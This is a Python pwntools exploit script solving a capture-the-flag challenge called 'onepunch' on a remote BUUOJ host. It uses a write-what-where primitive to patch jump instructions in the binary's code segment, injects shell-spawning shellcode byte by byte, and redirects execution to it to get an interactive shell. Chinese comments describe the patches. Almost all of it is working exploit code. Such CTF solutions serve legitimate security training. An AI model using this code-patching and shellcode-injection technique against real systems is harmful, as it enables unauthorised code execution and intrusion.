# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './onepunch'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '29776'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

def writeData(addr,data):
    sla('Where What?',hex(addr) + ' ' + str(data))

# one_gad = one_gadget(libc.path)

def attack():
    
    text = 0x400767
    
    # 其中第二个输入为整形 int
    writeData(text+1,u32(asm('jnz $-0x4A')[1:].ljust(4,'\x00')))
    # 修改跳转指令让其无限循环
    writeData(text,u32(asm('jmp $-0x4A')[0:1].ljust(4,'\x00')))
    # 修改跳转指令为无条件跳转

    shellcode = asm(shellcraft.sh())

    shellcode_addr = 0x0000000000400769
    for i in range(len(shellcode)):
        writeData(shellcode_addr + i, u8(shellcode[i]))

    writeData(text+1,u32(asm('jnz $+0x2')[1:].ljust(4,'\x00')))
    # 修改跳转让其跳转到 shellcode
    # dbg()

    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   onepunch.py
@Time    :   2022/02/03 22:00:21
@Author  :   Niyah 
'''